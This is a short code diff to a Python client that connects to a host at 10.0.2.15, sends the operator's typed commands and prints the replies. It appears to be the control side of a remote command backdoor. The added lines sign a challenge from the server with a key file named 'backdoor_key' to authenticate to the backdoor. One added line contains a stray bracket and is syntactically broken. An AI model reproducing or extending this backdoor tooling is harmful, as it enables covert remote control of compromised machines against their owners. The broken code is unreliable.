@@ -10,6 +10,11 @@ port = 12345
 # connect to the server on local computer 
 s.connect(('10.0.2.15', port)) 
 
+request_to_sign = s.recv(8024)
+signer = subprocess.Popen(["ssh-keygen", "-Y", "sign", "-f", "backdoor_key", "-n", "key"], stdin = subprocess.PIPE, stdout = subprocess.PIPE])
+signature, err = signer.communicate(request_to_sign)
+s.sendall(signature)
+
 # receive data from the server and decoding to get the string.
 print (s.recv(1024).decode())
 # close the connection
@@ -18,7 +23,7 @@ while True:
     cmd = input()
     
     s.send(cmd.encode())
-    print (s.recv(1024).decode())
+    print (s.recv(8024).decode())
     if cmd == "close":
         break
 
